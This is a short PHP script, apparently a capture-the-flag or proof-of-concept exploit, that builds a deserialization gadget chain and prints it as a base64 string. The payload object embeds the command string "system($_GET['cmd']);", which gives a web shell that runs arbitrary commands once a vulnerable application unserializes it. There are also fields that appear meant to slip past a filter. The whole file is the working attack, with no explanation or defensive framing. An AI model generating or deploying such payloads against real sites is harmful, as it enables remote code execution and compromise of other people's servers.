<?php

namespace GadgetOne {
    class Adders
    {
        private $x;
        function __construct($x)
        {
            $this->x = $x;
        }
    }
}

namespace GadgetThree {

    class Vuln
    {
        public $waf1 = 1;
        public $waf2 = "\xde\xad\xbe\xef";
        public $waf3 = false;
        public $cmd = "system(\$_GET['cmd']);";
    }
}


namespace GadgetTwo {
    class Echoers
    {
        public $klass;
    }
}



namespace {
    $gdt3 = new \GadgetThree\Vuln();
    $gdt1 = new \GadgetOne\Adders($gdt3);

    $gdt2 = new \GadgetTwo\Echoers();
    $gdt2->klass = $gdt1;

    echo base64_encode(serialize($gdt2)) . PHP_EOL;
}